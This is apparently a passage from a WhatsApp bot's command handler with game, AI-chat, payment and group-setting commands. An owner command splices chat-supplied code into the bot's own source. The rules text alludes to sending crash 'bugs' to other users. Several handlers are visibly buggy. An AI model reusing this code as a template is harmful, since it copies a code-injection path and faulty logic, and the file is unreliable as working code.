                        } else reply( `Gurita you are not enough`.trim())
                        break
                        case 'buntal':
                        if (global.db.users[m.sender].buntal >= count * 1) {
                            global.db.users[m.sender].money += Sbuntal * count
                            global.db.users[m.sender].buntal -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
                        } else reply( `Ikan Buntal you are not enough`.trim())
                        break
                        case 'hiu':
                        if (global.db.users[m.sender].hiu >= count * 1) {
                            global.db.users[m.sender].money += Shiu * count
                            global.db.users[m.sender].hiu -= count * 1
                            reply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
                        } else reply( `Hiu you are not enough`.trim())
                        break
                        case 'orca':
                        if (global.db.users[m.sender].orca >= count * 1) {
                            global.db.users[m.sender].money += Sorca * count
                            global.db.users[m.sender].orca -= count * 1
                            reply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
                        } else reply( `Paus Orca you are not enough`.trim())
                        break
                        case 'lumba':
                        if (global.db.users[m.sender].lumba >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].lumba -= count * 1
                            reply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
                        } else reply( `Lumba Lumba you are not enough`.trim())
                        break
                        case 'paus':
                        if (global.db.users[m.sender].paus >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].paus -= count * 1
                            reply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
                        } else reply( `Paus you are not enough`.trim())
                        break
                  case 'lobster':
                        if (global.db.users[m.sender].lobster >= count * 1) {
                            global.db.users[m.sender].money += Slobster * count
                            global.db.users[m.sender].lobster -= count * 1
                            reply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
                        } else reply( `Lobster you are not enough`.trim())
                        break
                     case 'udang':
                        if (global.db.users[m.sender].udang >= count * 1) {
                            global.db.users[m.sender].money += Sudang * count
                            global.db.users[m.sender].udang -= count * 1
                            reply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
                        } else reply( `Udang you are not enough`.trim())
                        break
                      case 'cumi':
                        if (global.db.users[m.sender].cumi >= count * 1) {
                            global.db.users[m.sender].money += Scumi * count
                            global.db.users[m.sender].cumi -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
                        } else reply( `Cumi you are not enough`.trim())
                         break
                        case 'botol':
                        if (global.db.users[m.sender].botol >= count * 1) {
                            global.db.users[m.sender].money += Sbotol * count
                            global.db.users[m.sender].botol -= count * 1
                            reply( `Sukses Menjual ${count} Botol Dengan Harga ${Sbotol * count} Money `.trim())
                        } else reply( `Botol you are not enough`.trim())
                        break         
                        case 'kaleng':
                        if (global.db.users[m.sender].kaleng >= count * 1) {
                            global.db.users[m.sender].money += Skaleng * count
                            global.db.users[m.sender].kaleng -= count * 1
                            reply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
                        } else reply( `Kaleng you are not enough`.trim())
                        break        
                        case 'kardus':
                        if (global.db.users[m.sender].kardus >= count * 1) {
                            global.db.users[m.sender].money += Skardus * count
                            global.db.users[m.sender].kardus -= count * 1
                            reply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
                        } else reply( `Kardus you are not enough`.trim())
                        break
                         case 'gelas':
                        if (global.db.users[m.sender].gelas >= count * 1) {
                            global.db.users[m.sender].money += Sgelas * count
                            global.db.users[m.sender].gelas -= count * 1
                            reply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
                        } else reply( `Gelas you are not enough`.trim())
                        break
                        case 'plastik':
                        if (global.db.users[m.sender].plastik >= count * 1) {
                            global.db.users[m.sender].money += Splastik * count
                            global.db.users[m.sender].plastik -= count * 1
                            reply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
                        } else reply( `Plastik you are not enough`.trim())
                        break       
                default:
                    return m.reply(Kchat)
            }
        }
} catch (err) {
console.log(util.format(err))
let e = String(err)
LordVoltage.sendMessage("23481xxxxx@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}}
}
break
//==================================================================
case 'ojek':
case 'bike': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = LordVoltage.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Bike'
    LordVoltage.misi = LordVoltage.misi ? LordVoltage.misi: {}
    if (id in LordVoltage.misi) {
        reply( `Complete the Mission ${LordVoltage.misi[id][0]} Above all`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku4 = Math.floor(Math.random() * 10)
        let randomaku5 = Math.floor(Math.random() * 10)

        let rbrb4 = (randomaku4 * 100000)
        let rbrb5 = (randomaku5 * 1000)

        var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       🛵
✔️ Get orders....
`.trim()

        var dimas2 = `
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️
➕ Deliver to destination....
`.trim()

        var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️
➕ Arrive at your destination....
`.trim()

        var dimas4 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️ 🚶
➕ 🙂Receive salary....
`.trim()

        var hsl = `
*—[ Motorbike taxi results ${name} ]—*
➕ 🙂 Money = [ ${rbrb4} ]
➕ 🙂 Exp = [ ${rbrb5} ]
➕ 😍 Order Completed = +1
➕ 📥Total Previous Orders : ${order}
`.trim()
        
        user.money += rbrb4
        user.exp += rbrb5
        user.ojekk += 1

		LordVoltage.misi[id] = [
            kerja,
            setTimeout(() => {
                delete LordVoltage.misi[id]
            }, 27000)
        ]
        
        setTimeout(() => {
            m.reply(hsl)
        }, 27000)

        setTimeout(() => {
            m.reply(dimas4)
        }, 25000)

        setTimeout(() => {
            m.reply(dimas3)
        }, 20000)

        setTimeout(() => {
            m.reply(dimas2)
        }, 15000)

        setTimeout(() => {
            m.reply(dimas)
        }, 10000)

        setTimeout(() => {
            m.reply('🔍Looking for customers.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else m.reply(`Please wait for ${timers}, to complete the mission again`)
}}
break
//==================================================================
case 'maling':
case 'thief': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    
  
  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " hours " + minutes + " minutes " + seconds + " seconds"
}
const timeout = 604800000

    let user = db.users[m.sender]
    let time = user.lastmaling + 604800000
    if (new Date - user.lastmaling< 604800000) return m.reply(`📮You've robbed a bank\nWait for ⏲️ ${msToTime(time - new Date())} Again`)
	let money = `${Math.floor(Math.random() * 30000)}`.trim()
	let exp = `${Math.floor(Math.random() * 999)}`.trim()
	let kardus = `${Math.floor(Math.random() * 1000)}`.trim()
	user.money += money * 1
	user.exp += exp * 1
	user.kardus += kardus * 1
	user.lastmaling = new Date * 1
    m.reply(`Congratulations you got it : \n💰+${money} Money\📦+${kardus} Cardboard box\n🙂+${exp} Exp`)
    setTimeout(() => {
        reply(`Come on, it's thief time again 🙂…`)
    }, timeout)
}}
break
//==================================================================
case 'mancing':
case 'fishing': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers) 
    let name = LordVoltage.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Memancing'
    LordVoltage.misi = LordVoltage.misi ? LordVoltage.misi : {}
    if (id in LordVoltage.misi) {
        reply(`Complete the Mission ${LordVoltage.misi[id][0]} Above all`)
        throw false
    }
    if (user.umpan == 0) return m.reply('You Need Bait To Fish!')
    if (user.fishingrod == 0 ) return m.reply('You Must Have a Fishing Rod 🎣 Above all If You Want to Fish')
    if (new Date - user.lastmisi > 3600000) {
		let ikan1 = Math.floor(Math.random() * 5)
		let ikan2 = Math.floor(Math.random() * 5)
		let ikan3 = Math.floor(Math.random() * 5)
		let ikan4 = Math.floor(Math.random() * 5)
		let ikan5 = Math.floor(Math.random() * 5)
		let ikan6 = Math.floor(Math.random() * 5)
		let ikan7 = Math.floor(Math.random() * 5)
		let ikan8 = Math.floor(Math.random() * 5)
		let ikan9 = Math.floor(Math.random() * 5)
		let ikan10 = Math.floor(Math.random() * 5)
		let ikan11 = Math.floor(Math.random() * 5)
           
		let hsl = `   
*📮 Hasil tangkapan Mu*
${ikan1 ? `
🦀 Kepiting: ${ikan1}` : ''} ${ikan2 ? `
🦞 Lobster: ${ikan2}` : ''} ${ikan3 ? `
🦐 Udang: ${ikan3}` : ''} ${ikan4 ? `
🦑 Cumi: ${ikan4}` : ''} ${ikan5 ? `
🐙 Gurita: ${ikan5}` : ''} ${ikan6 ? `
🐡 Buntal: ${ikan6}` : ''} ${ikan7 ? `
🐠 Dory: ${ikan7}` : ''} ${ikan8 ? `
🐳 Orca: ${ikan8}` : ''} ${ikan9 ? `
🐬 Lumba: ${ikan9}` : ''} ${ikan10 ? `
🐋 Paus: ${ikan10}` : ''} ${ikan11 ? `
🦈 Hiu: ${ikan11}` : ''}
`.trim()
		user.kepiting += ikan1
		user.lobster += ikan2
		user.udang += ikan3
		user.cumi += ikan4
		user.gurita += ikan5
		user.buntal += ikan6
		user.dory += ikan7
		user.orca += ikan8
		user.lumba += ikan9
		user.paus += ikan10
		user.hiu += ikan11
		user.fishingroddurability -= 10
		user.umpan -= 1
		
		LordVoltage.misi[id] = [
        kerja,
        setTimeout(() => {
            delete LordVoltage.misi[id]
        }, 20000)
    	]
    
		setTimeout(() => {
			m.reply(hsl)
		}, 20000)

		setTimeout(() => {
			m.reply(`Here are your catches`)
		}, 18000)

		setTimeout(() => {
			m.reply('You Successfully Pulled the Fish Out of the Water')
		}, 15000)

		setTimeout(() => {
			m.reply('You Pull Your Hook')
		}, 12000)
		
		setTimeout(() => {
			m.reply('Your hook is pulled by the fish...')
		}, 9000)

		setTimeout(() => {
			m.reply('Youre Fishing...')
		}, 0)
		user.lastmisi = new Date * 1
	} else m.reply(`Please Wait for ${timers} Before Starting the Mission Again`)
}}
break

//==================================================================
case 'nguli':
case 'hangout': { if (prefix === '.') {
  if (!m.isGroup) return reply(mess.only.group)
    if (new Date - global.db.users[m.sender].lastnguli > 86400000) {
      global.db.users[m.sender].limit += 10
      m.reply('_🎉Congratulations you got it +10 limit_')
      global.db.users[m.sender].lastnguli = new Date * 1
    } else m.reply('[💬] Youve claimed your paycheck today')
  }}
break
//==================================================================
  case 'addcase': { if (prefix === '.') {
    if (!DanzTheCreator) return reply(mess.only.owner)
    if (!text) return replynano('Wheres the case?');
    const fs = require('fs').promises;
// Nama file yang akan dimodifikasi
const namaFile = 'Spark.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('An error occurred while reading the file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replynano('An error occurred while writing the file:', err);
            } else {
                replynano('New case successfully added above gimage case.');
            }
        });
    } else {
        replynano('Cannot find gimage case in files.');
    }
});

}}
break;

  
  // Case-case lainnya

//==================================================================
case 'help': {
  if (prefix === '.') {
    let helpText = `
╭ 𝐖𝐀𝐍𝐓 𝐇𝐄𝐋𝐏 𝐎𝐍 𝐇𝐎𝐖 𝐓𝐎 𝐃𝐄𝐏𝐋𝐎𝐘/𝐔𝐒𝐄 𝐁𝐎𝐓𝐒?
┃
┃ 𝐅𝐎𝐋𝐋𝐎𝐖 𝐓𝐇𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐋𝐈𝐍𝐊 𝐁𝐄𝐋𝐎𝐖 𝐅𝐎𝐑 𝐀𝐋𝐋 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐀𝐍𝐃 𝐔𝐏𝐃𝐀𝐓𝐄𝐒..\n> [https://whatsapp.com/channel/0029VbAaOJLInlqVwhwtxS33]
╰`;
    LordVoltage.sendMessage(m.chat, {
      text: helpText,
      contextInfo:channelContextInfo,
    }, { quoted: fkontak });

    setTimeout(async () => {
      const rulesText = `
╭─━━★❬ SHADØW-XMD-V1 BOT BY ♧ 𝗠𝗔𝗫𝗧𝗘𝗖𝗛♧ ❭★━━─╮

✨ DO NOT SPAM BOTS, IF CAUGHT YOU WILL BE BANNED.

✨ IF THE BOT DOES NOT ANSWER ONCE, PLEASE TRY AGAIN. BUT IF THE BOT DOESN'T ANSWER TWICE, THAT MEANS IT'S DELAYED, DON'T USE IT YET.

✨ ENSURE YOUR BANK INFO IS STATED AT CONFIG.JS FILE TO ENJOY THE CMD "AZA".

✨ NOTE THAT BOT IS STILL UNDER DEVELOPMENT SO SOME CMDS MAY HAVE GLITCHES OR WON'T WORK.

✨ IT IS PROHIBITED TO SEND VERTEX/BUG TO PEOPLE, EVEN IF THERE IS NO EFFECT, DON'T SPAM.

✨ IF YOU ARE LINKING ADMIN PANEL ALL SETTINGS ARE IN CONFIG.JS.

✨ IF YOU DON'T UNDERSTAND HOW TO USE THE BOT, PLEASE ASK ANOTHER MEMBER. OR IF YOU HAVEN'T JOINED THE BOT CHANNEL, ASK FOR THE LINK AND JOIN.

✨ IF THERE IS AN ERROR FEATURE/DON'T UNDERSTAND HOW TO USE IT, PLEASE REPORT/ASK THE OWNER.

✨ IF THE BOT IS DELAYED, DON'T SPAM IT FIRST.

✨ SENDING RANDOM BUGS TO RANDOM PEOPLE IS STRICTLY PROHIBITED.

⚙️ ALWAYS CHECK THE BOT'S PREFIX BEFORE USING ANY COMMAND TO AVOID UNEXPECTED ISSUES.

╰────────────────────────────────────╯
`;
      await LordVoltage.sendMessage(m.chat, { text: rulesText }, { quoted: m });
    }, 3000); // 3000 milliseconds = 3 seconds
  }
}
break;

// Remove the 'rules' case entirely


//=============================================
case 'shadowai': { if (prefix === '.') {
if (!q) return reply(` *Want to ask shadow something?*`)
var Yoriai = await fetchJson(`https://apis.davidcyriltech.my.id/ai/chatbot?query=${text}`)
var lenai = Yoriai.result
await reply(`${lenai}`)
}}
break
//==================================================================
case 'aza':
case 'pay':
case 'payment': {
let menya =`
╭─═══ BANK DETAILS ═══─╮
│
│ ★ ${global.bankowner}
│ ★ ${global.banknumber}
│ ★ ${global.bankname}
│
╰─═══ SEND SCREENSHOT ═══─╯
AFTER PAYMENT
> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Fᴀᴍøᴜs Dᴇᴠ 👑` 
const imagePath = './data/image/jdw.jpg'; // Path to 
const menuImage = fs.readFileSync(imagePath);
await LordVoltage.sendMessage(
                                m.chat,
                                {
                                    image: menuImage,
                                    caption: menya, contextInfo: channelContextInfo,
    }, { quoted: repPy });
        }
break
case 'gpt4':
case 'gpt': { if (prefix === '.') {
	if (!text) return replynano(`*• Example:* ${prefix + command} what model are you`);   
await LordVoltage.sendMessage(m.chat, { react: { text: "🤔",key: m.key,}}) 
        try {
let gpt = await fetchJson(`https://apis.davidcyriltech.my.id/ai/chatbot?query=${text}`)
const ai = "*(✿╹◡╹)ﾉʰᵉˡˡᵒ♡*\n\n" + gpt.result
replynano(ai)
 } catch(e) {
 return replynano("`*Error:(*` \n\n" + e)
}}
}
break
case 'realistic': case '3dmodel': { if (prefix === '.') {
    	if (!text) return reply(`*Example:* ${prefix + command} blue sky`)
await LordVoltage.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, bad face drawing, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    await LordVoltage.sendMessage(m.chat, { image: { url: gpt.result }, caption: ``}, {quoted: m})
LordVoltage.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
  } catch(e) {
    return reply("`GPT Not Responding`")
  }
}}
break
case 'openai':
case 'chatgpt':
case 'open-ai': { if (prefix === '.') {
  if (!text) return replynano(`Example: ${prefix + command} query`)
  const hasil = await chatGpt(text);
   return replynano(`❗ *Error*`);
}}
break

//=========================================\\======
case 'gemini': { if (prefix === '.') {
if (!q) return reply(`🙂 *What do you want to ask Gemini??*`)
var Yoriai = await fetchJson(`https://aemt.me/gemini?text=${q}`)
var lenai = Yoriai.result
await replynano(lenai)
}}
break
//=========================================\\======

//=========================================\\======
//=========================================\\======
case 'autoaigrup':case 'aigrup': case 'autoaigc':{ if (prefix === '.') {
if (!m.isGroup) return reply('Group Special Features!')
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return reply(`It's active`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return reply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
reply('Successfully Disabling Auto AI')
} else {
reply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}}
break

// ==========================================\\======
case 'welcome':
    if (prefix === '.') {
        if (!m.isGroup) return reply('Group Special Features!!!');

        const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) { return; }

        // Determine if welcome is currently enabled for this group
        const isWelcomeEnabledForGroup = _welcome.includes(m.chat);

        if (args[0] === "on") {
            // Assuming addCountCmd exists and is accessible
            // addCountCmd('#welcome', m.sender, _cmd);

            if (isWelcomeEnabledForGroup) return reply(`Welcome messages are already enabled for this group.`);

            _welcome.push(m.chat);
            fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2));
            reply('Successfully activated welcome messages for this group.');

        } else if (args[0] === "off") {
            // addCountCmd('#welcome', m.sender, _cmd);

            if (!isWelcomeEnabledForGroup) return reply(`Welcome messages are already disabled for this group.`);

            let anu = _welcome.indexOf(m.chat);
            if (anu !== -1) { // Only splice if found
                _welcome.splice(anu, 1);
            }
            fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2));
            reply('Successfully deactivated welcome messages for this group.');

        } else {
            reply(`${prefix+command} on -- _Activate welcome messages_\n${prefix+command} off -- _Disable welcome messages_`);
        }
    }
    break;

case 'left':
case 'goodbye':
    if (prefix === '.') {
        if (!m.isGroup) return reply('Group Special Features!');

        const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) { return; }

        // Determine if leave is currently enabled for this group
        const isLeftEnabledForGroup = _left.includes(m.chat);

        if (args[0] === "on") {
            // addCountCmd('#left', m.sender, _cmd);

            if (isLeftEnabledForGroup) return reply(`Goodbye messages are already enabled for this group.`);

            _left.push(m.chat);
            fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2));
            reply('Successfully activated goodbye messages for this group.');

        } else if (args[0] === "off") {
            // addCountCmd('#left', m.sender, _cmd);

            if (!isLeftEnabledForGroup) return reply(`Goodbye messages are already disabled for this group.`);

            let anu = _left.indexOf(m.chat);
            if (anu !== -1) { // Only splice if found
                _left.splice(anu, 1);
            }
            // 🛑 CRITICAL FIX: Ensure you write to left.json, not welcome.json 🛑
            fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2));
            reply('Successfully deactivated goodbye messages for this group.');

        } else {
            reply(`${prefix+command} on -- _Activate goodbye messages_\n${prefix+command} off -- _Disable goodbye messages_`);
        }
    }
    break;
 // Make sure you have fs required at the top of Spark.js

// ... your other requires ...

case 'onlygroup':
case 'onlygc':
  if (prefix === '.') {
    if (!DanzTheCreator) return reply('Special Owner Features!');
    if (args.length < 1) return replynano(`Example: ${prefix + command} on/off`);
    if (q == 'on') {
      db.settings[botNumber].onlygrub = true;
      fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2)); // Save the db
      replynano(`Successfully Changed Onlygroup To ${q}`);
    } else if (q == 'off') {
      db.settings[botNumber].onlygrub = false;
      fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2)); // Save the db
      replynano(`Successfully Changed Onlygroup To ${q}`);
    }
  }
  break;

case 'onlyprivatechat':
case 'onlypc':
  if (prefix === '.') {
    if (!DanzTheCreator) return reply('Special Owner Features!');
    if (args.length < 1) return replynano(`Example: ${prefix + command} on/off`);
    if (q == 'on') {
      db.settings[botNumber].onlypc = true;
      fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2)); // Save the db
      replynano(`Successfully Changed Only-Pc To ${q}`);
    } else if (q == 'off') {
      db.settings[botNumber].onlypc = false;
      fs.writeFileSync('./database/database.json', JSON.stringify(global.db, null, 2)); // Save the db
      replynano(`Successfully Changed Only-Pc To ${q}`);
    }
  }
  break;

// ... your other command cases ...

// ==========================================\\======
case 'setwelcome':
    if (prefix === '.') {
        if (!m.isGroup) return reply('Group Special Features!');
        // Assuming DanzTheCreator and isAdmins are defined in this scope
        if (!DanzTheCreator && !isAdmins) return reply('Special Owner Features!');
        if (!text) return reply(`Use it with ${prefix+command} *text_welcome*\n\n_Example_\n\n${prefix+command} Hello @user, Welcome to @group`);

        // 🛑 CORRECTED: Removed 'set_welcome_db' argument 🛑
        if (isSetWelcome(m.chat)) return reply(`Set welcome already active`);

        // 🛑 CORRECTED: Removed 'set_welcome_db' argument 🛑
        addSetWelcome(text, m.chat); // Note: using 'text' as the message content, assuming 'q' isn't defined here
        // Assuming addCountCmd exists
        // addCountCmd('#setwelcome', m.sender, _cmd);
        reply(`Successfully set welcome!`);
    }
    break;

case 'changewelcome':
    if (prefix === '.') {
        if (!m.isGroup) return reply('Group Special Features!');
        if (!DanzTheCreator && !isAdmins) return reply('Special Owner Features!');
        if (!text) return reply(`Use it with ${prefix+command} *text_welcome*\n\n_Example_\n\n${prefix+command} Hello @user, Welcome to @group`);

        // 🛑 CORRECTED: Removed 'set_welcome_db' argument 🛑
        if (isSetWelcome(m.chat)) {
            // addCountCmd('#changewelcome', m.sender, _cmd);
            // 🛑 CORRECTED: Removed 'set_welcome_db' argument 🛑
            changeSetWelcome(q, m.chat); // Assuming 'q' holds the message content here
            reply(`Successfully changed set welcome text!`);
        } else {
            // addCountCmd('#changewelcome', m.sender, _cmd);
            // If it's not set, 'changewelcome' should probably add it, or give an error.
            // Your current logic adds it, which is fine.
            // 🛑 CORRECTED: Removed 'set_welcome_db' argument 🛑
            addSetWelcome(q, m.chat); // Assuming 'q' holds the message content here
            reply(`Successfully set welcome! (It wasn't set before)`); // More descriptive message
        }
    }
    break;

case 'delsetwelcome':
    if (prefix === '.') {
        if (!m.isGroup) return reply('Group Special Features!');
        if (!DanzTheCreator && !isAdmins) return reply('Special Owner Features!');

        // 🛑 CORRECTED: Removed 'set_welcome_db' argument 🛑
        if (!isSetWelcome(m.chat)) return reply(`There is no welcome set here yet..`);

        // 🛑 CORRECTED: Removed 'set_welcome_db' argument 🛑
        removeSetWelcome(m.chat);
        // addCountCmd('#delsetwelcome', m.sender, _cmd);
        reply(`Successfully deleted set welcome`);
    }
    break;
case 'setleft':
    if (prefix === '.') {
        if (!m.isGroup) return reply('Group Special Features!');
        // Assuming DanzTheCreator and isAdmins are defined in this scope
        if (!DanzTheCreator && !isAdmins) return reply('Special Owner Features!');
        if (!text) return reply(`Use it by ${prefix + command} *text_left*\n\n_Example_\n\n${prefix + command} Hello @user, Goodbye from @group`);

        // 🛑 CORRECTED: Removed 'set_left_db' argument 🛑
        if (isSetLeft(m.chat)) return reply(`Set left already active`);

        // Assuming addCountCmd exists
        // addCountCmd('#setleft', m.sender, _cmd);

        // 🛑 CORRECTED: Removed 'set_left_db' argument 🛑
        addSetLeft(q, m.chat);
        reply(`Successfully set left!`);
    }
    break;

case 'changeleft':
    if (prefix === '.') {
        if (!m.isGroup) return reply('Group Special Features!');
        if (!DanzTheCreator && !isAdmins) return reply('Special Owner Features!');
        if (!text) return reply(`Use it by ${prefix + command} *text_left*\n\n_Example_\n\n${prefix + command} Hello @user, Goodbye from @group`);

        // 🛑 CORRECTED: Removed 'set_left_db' argument 🛑
        if (isSetLeft(m.chat)) {
            // addCountCmd('#changeleft', m.sender, _cmd);

            // 🛑 CORRECTED: Removed 'set_left_db' argument 🛑
            changeSetLeft(q, m.chat);
            reply(`Successfully changed set left text!`);
        } else {
            // addCountCmd('#changeleft', m.sender, _cmd);

            // If it's not set, 'changeleft' should probably add it, or give an error.
            // Your current logic adds it, which is fine.
            // 🛑 CORRECTED: Removed 'set_left_db' argument 🛑
            addSetLeft(q, m.chat);
            reply(`Successfully set left! (It wasn't set before)`); // More descriptive message
        }
    }
    break;

case 'delsetleft':
    if (prefix === '.') {
        if (!m.isGroup) return reply('Group Special Features!');
        if (!DanzTheCreator && !isAdmins) return reply('Special Owner Features!');

        // 🛑 CORRECTED: Removed 'set_left_db' argument 🛑
        if (!isSetLeft(m.chat)) return reply(`There is no set left here yet..`);

        // addCountCmd('#delsetleft', m.sender, _cmd);

        // 🛑 CORRECTED: Removed 'set_left_db' argument 🛑
        removeSetLeft(m.chat);
        reply(`Successfully deleted set left`);
    }
    break;

case 'report': {if (prefix === '.') {
replynano(` =====[ *DEVELOPER OF SHADØW-XMD-V1* ]===== 
• ᴅᴏɴ'ᴛ ᴄʜᴀᴛ ᴄᴀʀᴇʟᴇꜱꜱʟʏ ᴛᴏ ᴛʜᴇ ᴏᴡɴᴇʀꜱ ɴᴜᴍʙᴇʀ, ɪᴛ ᴡɪʟʟ ʙᴇ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ʙʟᴏᴄᴋᴇᴅ
• ᴅᴏɴ'ᴛ ᴄᴀʟʟ/ᴛᴇʟᴇᴘʜᴏɴᴇ ᴛʜᴇ ᴏᴡɴᴇʀ ᴡɪᴛʜᴏᴜᴛ ᴘᴇʀᴍɪꜱꜱɪᴏɴ • ᴄʜᴀᴛ ꜱᴛʀᴀɪɢʜᴛ ᴛᴏ ᴛʜᴇ ᴘᴏɪɴᴛ, ᴛʏᴘᴇ .ᴏᴡɴᴇʀ or .reportbug , 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕",`)
}}
break
//=========================================\\======
case 'animeq':
case 'quotesanim': {if (prefix === '.') {
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}}
break
//=========================================\\======
case 'lolz': {if (prefix === '.') {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Do you like coffee? I really like it. Do you know the reason why? Coffee is like you, its bitter but it makes you addicted so you want to keep going.',
'Salary is like the former, right? Usually it only lasts for a moment.',
'Mr Haji said, guys who dont want to go to Friday prayers are told to just wear skirts.',
'Do you know your ex? An ex is like a salary person, usually just passing through our lives.',
'I like you, you like him, but unfortunately he doesnt like you. Wow, funny huh? Love is this complicated.',
